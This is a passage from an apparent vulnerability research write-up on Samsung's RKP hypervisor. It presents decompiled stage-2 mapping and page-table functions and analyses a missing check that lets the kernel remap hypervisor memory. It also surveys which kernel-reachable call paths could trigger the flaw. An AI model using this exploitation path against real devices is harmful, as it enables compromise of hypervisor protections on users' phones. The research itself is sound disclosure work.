  <span class="k">if</span> <span class="p">(</span><span class="n">start_addr</span> <span class="o">==</span> <span class="n">end_addr</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">addr</span> <span class="o">=</span> <span class="n">start_addr</span><span class="p">;</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_set_pgt_bitmap</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">access</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"rkp_paging.c"</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="s">"set_pgt_bitmap fail, %p"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">tlbivaae1is</span><span class="p">(((</span><span class="n">addr</span> <span class="o">+</span> <span class="mh">0x80000000</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0xFFFFFFC000000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">);</span>
    <span class="n">addr</span> <span class="o">+=</span> <span class="mh">0x1000</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>rkp_s2_range_change_permission</code> also does some checking on its arguments:</p>
<ul>
<li>if <code>allow == 0</code>, then RKP must be initialized;</li>
<li>if <code>allow == 1</code>, then RKP must be deferred initialized;</li>
<li><code>start_addr</code> and <code>end_addr</code> must be page-aligned;</li>
<li><code>start_addr</code> must be lower than <code>end_addr</code>.</li>
</ul>
<p>After that it also determines the memory attributes to apply to the page based on the arguments, calls <code>s2_map</code> that effectively modifies the stage 2 page tables, marks the pages as read-only or not in the <code>ro_bitmap</code>, and flushes the TLBs.</p>
<div id="s2_map">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">s2_map</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">orig_addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">orig_size</span><span class="p">,</span> <span class="n">attrs_t</span> <span class="n">attrs</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">paddr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">paddr</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="n">addr</span> <span class="o">=</span> <span class="n">orig_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">orig_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">);</span>
  <span class="n">size</span> <span class="o">=</span> <span class="p">(</span><span class="n">orig_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">+</span> <span class="n">orig_size</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">size</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1FFFFF</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0x1FFFFF</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">map_s2_page</span><span class="p">(</span><span class="o">*</span><span class="n">paddr</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mh">0x200000</span><span class="p">,</span> <span class="n">attrs</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"s2.c"</span><span class="p">,</span> <span class="mi">1132</span><span class="p">,</span> <span class="s">"unable to map 2mb s2 page: %p"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">size</span> <span class="o">-=</span> <span class="mh">0x200000</span><span class="p">;</span>
    <span class="n">addr</span> <span class="o">+=</span> <span class="mh">0x200000</span><span class="p">;</span>
    <span class="o">*</span><span class="n">paddr</span> <span class="o">+=</span> <span class="mh">0x200000</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">size</span><span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0xFFF</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">map_s2_page</span><span class="p">(</span><span class="o">*</span><span class="n">paddr</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">attrs</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"s2.c"</span><span class="p">,</span> <span class="mi">1150</span><span class="p">,</span> <span class="s">"unable to map 4kb s2 page: %p"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">size</span> <span class="o">-=</span> <span class="mh">0x1000</span><span class="p">;</span>
    <span class="n">addr</span> <span class="o">+=</span> <span class="mh">0x1000</span><span class="p">;</span>
    <span class="o">*</span><span class="n">paddr</span> <span class="o">+=</span> <span class="mh">0x1000</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">size</span><span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>s2_map</code> is a wrapper around <code>map_s2_page</code> that takes into account the various page/block sizes that make up the memory range given as argument. <code>map_s2_page</code> directly operates on the page tables and does not care about anything else (in particular, the control structures).</p>
<p>You might have already noticed that <code>rkp_s2_range_change_permission</code> doesn't do as many checks as <code>rkp_s2_page_change_permission</code>. In particular, it doesn't ensure that the pages of the memory range are not marked <code>S2UNMAP</code> in the <code>physmap</code>. So if we give it a memory range in to the hypervisor, it will happily remap it in the stage 2.</p>
<p>But the check of the <code>physmap</code> in <code>rkp_s2_page_change_permission</code> doesn't even matter. One would expect a page to marked <code>S2UNMAP</code> in the <code>physmap</code> when it is actually unmapped from the stage 2. Below is the code of <code>s2_unmap</code> that does the unmapping:</p>
<div id="s2_unmap">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">s2_unmap</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">orig_addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">orig_size</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">addr</span> <span class="o">=</span> <span class="n">orig_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000</span><span class="p">;</span>
  <span class="n">size</span> <span class="o">=</span> <span class="p">(</span><span class="n">orig_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">+</span> <span class="n">orig_size</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">size</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x3FFFFFFF</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0x3FFFFFFF</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">unmap_s2_page</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"s2.c"</span><span class="p">,</span> <span class="mi">1175</span><span class="p">,</span> <span class="s">"unable to unmap 1gb s2 page: %p"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">size</span> <span class="o">-=</span> <span class="mh">0x40000000</span><span class="p">;</span>
    <span class="n">addr</span> <span class="o">+=</span> <span class="mh">0x40000000</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">size</span><span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1FFFFF</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0x1FFFFF</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">unmap_s2_page</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mh">0x200000</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"s2.c"</span><span class="p">,</span> <span class="mi">1183</span><span class="p">,</span> <span class="s">"unable to unmap 2mb s2 page: %p"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">size</span> <span class="o">-=</span> <span class="mh">0x200000</span><span class="p">;</span>
    <span class="n">addr</span> <span class="o">+=</span> <span class="mh">0x200000</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">size</span><span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0xFFF</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">unmap_s2_page</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'L'</span><span class="p">,</span> <span class="s">"s2.c"</span><span class="p">,</span> <span class="mi">1191</span><span class="p">,</span> <span class="s">"unable to unmap 4kb s2 page: %p"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">-1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">size</span> <span class="o">-=</span> <span class="mh">0x1000</span><span class="p">;</span>
    <span class="n">addr</span> <span class="o">+=</span> <span class="mh">0x1000</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">size</span><span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>s2_unmap</code>, similarly to <code>s2_map</code>, is a wrapper around <code>unmap_s2_page</code>. It turns out there really are no calls to <code>rkp_phys_map_set</code>, <code>rkp_phys_map_set_region</code>, or even the low level <code>sparsemap_set_value_addr</code>, that ever mark a page as <code>S2UNMAP</code>. So we can even use <code>rkp_s2_page_change_permission</code> to remap hypervisor memory.</p>
<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">¶</a></h2>
<p>To exploit this two-fold bug, we need to look for calls to the <code>rkp_s2_page_change_permission</code> and <code>rkp_s2_range_change_permission</code> functions, that can be triggered from the kernel after the hypervisor has been initialized, and with controllable arguments.</p>
<h3 id="exploring-our-options">Exploring Our Options<a class="headerlink" href="#exploring-our-options" title="Permanent link">¶</a></h3>
<p><code>rkp_s2_page_change_permission</code> is called:</p>
<ul>
<li>in <code>rkp_l1pgt_process_table</code></li>
<li>in <code>rkp_l2pgt_process_table</code></li>
<li>in <code>rkp_l3pgt_process_table</code></li>
<li>in <code>set_range_to_pxn_l3</code> (called from <code>rkp_set_range_to_pxn</code>)</li>
<li>in <code>set_range_to_rox_l3</code> (called from <code>rkp_set_range_to_rox</code>)</li>
<li>in <code>rkp_set_pages_ro</code></li>
<li>in <code>rkp_ro_free_pages</code></li>
</ul>
<p>And <code>rkp_s2_range_change_permission</code> is called:</p>
<ul>
<li>in many <code>dynamic_load_xxx</code> functions</li>
</ul>
<h4 id="rkp_lxpgt_process_table"><code>rkp_lxpgt_process_table</code><a class="headerlink" href="#rkp_lxpgt_process_table" title="Permanent link">¶</a></h4>
<p>We have taken a closer look at the functions <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_l1pgt_process_table"><code>rkp_l1pgt_process_table</code></a>, <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_l2pgt_process_table"><code>rkp_l2pgt_process_table</code></a> and <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_l3pgt_process_table"><code>rkp_l3pgt_process_table</code></a> in the first blog post. It seems fairly easy to reach the call to <code>rkp_s2_page_change_permission</code> in these functions, assuming that we control their first argument.</p>
<p>If the third argument <code>is_alloc == 1</code>, then the page needs to not be marked as <code>LX</code> in the <code>physmap</code>, and as a result it will be set as read-only in the stage 2 and marked as <code>LX</code> in the <code>physmap</code>. If the third argument <code>is_alloc == 0</code>, then the page needs to be marked as <code>LX</code> in the <code>physmap</code>, and as a result it will be set as read-write in the stage 2 and marked as <code>FREE</code> in the <code>physmap</code>. So by calling the function twice, once with <code>is_alloc == 1</code> and once with <code>is_alloc == 0</code>, we should be able to call <code>rkp_s2_page_change_permission</code> with the read-write permissions (and then write to hypervisor memory directly from the kernel).</p>
<p>The next questions is: can we call the <code>rkp_lxpgt_process_table</code> functions with controlled arguments?</p>
<p><code>rkp_l1pgt_process_table</code> is called:</p>
<ul>
<li>in <code>rkp_l1pgt_ttbr</code></li>
<li>in <code>rkp_l1pgt_new_pgd</code></li>
<li>in <code>rkp_l1pgt_free_pgd</code></li>
</ul>
<div id="rkp_l1pgt_ttbr">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_l1pgt_ttbr</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ttbr</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">user_or_kernel</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">pgd</span> <span class="o">=</span> <span class="n">ttbr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">rkp_deferred_inited</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">should_process</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">should_process</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">user_or_kernel</span> <span class="o">==</span> <span class="mh">0x1FFFFFF</span> <span class="o">||</span> <span class="n">pgd</span> <span class="o">!=</span> <span class="n">ZERO_PG_ADDR</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">rkp_inited</span><span class="p">)</span>
        <span class="n">should_process</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">pgd</span> <span class="o">==</span> <span class="n">INIT_MM_PGD</span><span class="p">)</span>
        <span class="n">should_process</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">pgd</span> <span class="o">==</span> <span class="n">TRAMP_PGD</span> <span class="o">&amp;&amp;</span> <span class="n">TRAMP_PGD</span><span class="p">)</span>
        <span class="n">should_process</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="n">get_sctlr_el1</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="o">!</span><span class="n">rkp_inited</span><span class="p">)</span>
        <span class="n">should_process</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">should_process</span> <span class="o">&amp;&amp;</span> <span class="n">rkp_l1pgt_process_table</span><span class="p">(</span><span class="n">pgd</span><span class="p">,</span> <span class="n">user_or_kernel</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">rkp_policy_violation</span><span class="p">(</span><span class="s">"Process l1t returned false, l1e addr : %lx"</span><span class="p">,</span> <span class="n">pgd</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">user_or_kernel</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">set_ttbr0_el1</span><span class="p">(</span><span class="n">ttbr</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="k">return</span> <span class="n">set_ttbr1_el1</span><span class="p">(</span><span class="n">ttbr</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>ttbr</code> and <code>user_or_kernel</code> are user-controlled, <code>rkp_deferred_inited == 1</code>, <code>rkp_inited == 1</code>, the MMU is enabled, so if either:</p>
<ul>
<li><code>user_or_kernel == 0</code> and <code>pgd == ZERO_PG_ADDR</code></li>
<li><code>user_or_kernel == 0x1FFFFFF</code> and <code>pgd != INIT_MM_PGD &amp;&amp; pgd != TRAMP_PGD</code></li>
</ul>
<p>then we should have <code>should_process == 1</code> and <code>rkp_l1pgt_process_table</code> will be called. But it will also either set the system register <code>TTBR0_EL1</code> or <code>TTBR1_EL1</code>, and we don't control the <code>is_alloc</code> argument, so it is not an optimal path. Let's take a look at the others.</p>
<p>We have already seen the functions <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_l1pgt_new_pgd"><code>rkp_l1pgt_new_pgd</code></a> and <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_l1pgt_free_pgd"><code>rkp_l1pgt_free_pgd</code></a> in the first blog post. They are very good candidates, but there is one drawback to using them. The value given to <code>rkp_l1pgt_process_table</code> comes from a call to <code>rkp_get_pa</code>, which itself calls <code>check_kernel_input</code>, a function that checks if the physical address is in the <code>protected_ranges</code>
 memlist. So we can't give it an hypervisor address directly. Instead 
what we need to do is to reach the processing of the next level, so that
 the value given to <code>rkp_l2pgt_process_table</code> comes from a descriptor's output address and not from a call to <code>rkp_get_pa</code>.</p>
<p><code>rkp_l2pgt_process_table</code> is called:</p>
<ul>
<li>in <code>rkp_l1pgt_process_table</code></li>
<li>in <code>rkp_l1pgt_write</code></li>
</ul>
<p>And <code>rkp_l3pgt_process_table</code> is called:</p>
<ul>
<li>in <code>check_single_l2e</code> (called from <code>rkp_l2pgt_process_table</code> and <code>rkp_l2pgt_write</code>)</li>
</ul>
<p>Finally, we have also seen the functions <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_l1pgt_write"><code>rkp_l1pgt_write</code></a> and <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_l2pgt_write"><code>rkp_l2pgt_write</code></a> in the first blog post. They are very good candidates too that allow calling <code>rkp_l2pgt_process_table</code> and <code>rkp_l3pgt_process_table</code> by writing in the kernel page tables a fake level 1 and level 2 descriptor respectively.</p>
<p>For the sake of completeness, we will take a look at our other 
options, even if we already have a good path to exploit the 
vulnerability.</p>
<h4 id="set_range_to_xxx_l3"><code>set_range_to_xxx_l3</code><a class="headerlink" href="#set_range_to_xxx_l3" title="Permanent link">¶</a></h4>
<p><code>set_range_to_pxn_l3</code> is called all the way from <code>rkp_set_range_to_pxn</code>:</p>
<div id="rkp_set_range_to_pxn">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_set_range_to_pxn</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">table</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">end_addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">res</span> <span class="o">=</span> <span class="n">set_range_to_pxn_l1</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_l1pgt.c"</span><span class="p">,</span> <span class="mi">186</span><span class="p">,</span> <span class="s">"Fail to change attribute to pxn"</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">end_addr</span> <span class="o">-</span> <span class="n">start_addr</span><span class="p">;</span>
  <span class="n">invalidate_s1_el1_tlb_region</span><span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
  <span class="n">paddr</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">start_addr</span><span class="p">);</span>
  <span class="n">invalidate_instruction_cache_region</span><span class="p">(</span><span class="n">paddr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="set_range_to_pxn_l1">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">set_range_to_pxn_l1</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">table</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">end_addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_phys_map_kernel</span><span class="p">(</span><span class="n">table</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">is_phys_map_l1</span><span class="p">(</span><span class="n">table</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">start_addr</span><span class="p">;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">do</span> <span class="p">{</span>
      <span class="n">next_end_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFC0000000</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x40000000</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">next_end_addr</span> <span class="o">&gt;</span> <span class="n">end_addr</span><span class="p">)</span>
        <span class="n">next_end_addr</span> <span class="o">=</span> <span class="n">end_addr</span><span class="p">;</span>
      <span class="n">table_desc</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">table</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="p">((</span><span class="n">next_start_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">));</span>
      <span class="k">if</span> <span class="p">((</span><span class="n">table_desc</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">set_range_to_pxn_l2</span><span class="p">(</span><span class="n">table_desc</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000</span><span class="p">,</span> <span class="n">next_start_addr</span><span class="p">,</span> <span class="n">next_end_addr</span><span class="p">);</span>
      <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">next_end_addr</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="set_range_to_pxn_l2">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">set_range_to_pxn_l2</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">table</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_addr</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">end_addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">rkp_phys_map_lock</span><span class="p">(</span><span class="n">table</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_phys_map_kernel</span><span class="p">(</span><span class="n">table</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">is_phys_map_l2</span><span class="p">(</span><span class="n">table</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">start_addr</span><span class="p">;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">do</span> <span class="p">{</span>
      <span class="n">next_end_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFE00000</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x200000</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">next_end_addr</span> <span class="o">&gt;</span> <span class="n">end_addr</span><span class="p">)</span>
        <span class="n">next_end_addr</span> <span class="o">=</span> <span class="n">end_addr</span><span class="p">;</span>
      <span class="n">table_desc_p</span> <span class="o">=</span> <span class="n">table</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="p">((</span><span class="n">next_start_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">21</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">table_desc_p</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">executable_regions_contains</span><span class="p">(</span><span class="o">*</span><span class="n">table_desc_p</span><span class="p">))</span>
          <span class="n">set_pxn_bit_of_desc</span><span class="p">(</span><span class="n">table_desc_p</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">set_range_to_pxn_l3</span><span class="p">(</span><span class="o">*</span><span class="n">table_desc_p</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000</span><span class="p">,</span> <span class="n">next_start_addr</span><span class="p">,</span> <span class="n">next_end_addr</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">table_desc_p</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">executable_regions_contains</span><span class="p">(</span><span class="o">*</span><span class="n">table_desc_p</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">set_pxn_bit_of_desc</span><span class="p">(</span><span class="n">table_desc_p</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">next_start_addr</span> <span class="o">=</span> <span class="n">next_end_addr</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">next_start_addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">-1</span><span class="p">;</span>
  <span class="p">}</span>
